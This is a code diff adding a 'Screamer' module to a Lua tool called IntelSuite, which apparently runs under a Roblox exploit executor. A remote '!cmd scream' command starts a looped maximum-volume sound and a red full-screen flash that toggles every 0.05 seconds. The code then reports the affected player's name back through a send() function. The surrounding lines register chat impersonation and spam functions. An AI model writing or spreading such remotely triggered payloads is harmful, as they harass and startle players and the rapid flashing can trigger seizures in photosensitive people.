@@ -1533,3 +1533,75 @@ end
 getgenv().IntelSuite.ChatAs = chatAs
 getgenv().IntelSuite.ChatSpam = chatSpam
 
+-- ============================================================
+-- MODULE 23: Screamer
+-- Plays max volume sound + flashes screen red repeatedly
+-- !cmd scream — trigger | !cmd screamstop — stop
+-- ============================================================
+local function startScreamer()
+    if getgenv().IntelSuite.ScreamerActive then return end
+    getgenv().IntelSuite.ScreamerActive = true
+
+    pcall(function()
+        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+        if not playerGui then return end
+
+        -- Flash GUI
+        local screen = Instance.new("ScreenGui")
+        screen.Name = "GhostScreamer"
+        screen.ResetOnSpawn = false
+        screen.IgnoreGuiInset = true
+        screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        screen.Parent = playerGui
+
+        local flash = Instance.new("Frame")
+        flash.Size = UDim2.new(1, 0, 1, 0)
+        flash.Position = UDim2.new(0, 0, 0, 0)
+        flash.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        flash.BackgroundTransparency = 1
+        flash.BorderSizePixel = 0
+        flash.ZIndex = 20
+        flash.Parent = screen
+
+        -- Loud sound
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://138186576"
+        sound.Volume = 10
+        sound.Looped = true
+        sound.Parent = workspace
+        sound:Play()
+
+        getgenv().IntelSuite.ScreamerSound = sound
+        getgenv().IntelSuite.ScreamerGui = screen
+
+        -- Flash loop
+        task.spawn(function()
+            while getgenv().IntelSuite.ScreamerActive do
+                flash.BackgroundTransparency = 0
+                task.wait(0.05)
+                flash.BackgroundTransparency = 1
+                task.wait(0.05)
+            end
+        end)
+
+        send("SCREAMER STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Max volume sound + red screen flash active.", 16711680)
+    end)
+end
+
+local function stopScreamer()
+    getgenv().IntelSuite.ScreamerActive = false
+    pcall(function()
+        if getgenv().IntelSuite.ScreamerSound then
+            getgenv().IntelSuite.ScreamerSound:Stop()
+            getgenv().IntelSuite.ScreamerSound:Destroy()
+        end
+        if getgenv().IntelSuite.ScreamerGui then
+            getgenv().IntelSuite.ScreamerGui:Destroy()
+        end
+    end)
+    send("SCREAMER STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Screamer deactivated.", 65280)
+end
+
+getgenv().IntelSuite.StartScreamer = startScreamer
+getgenv().IntelSuite.StopScreamer = stopScreamer
+
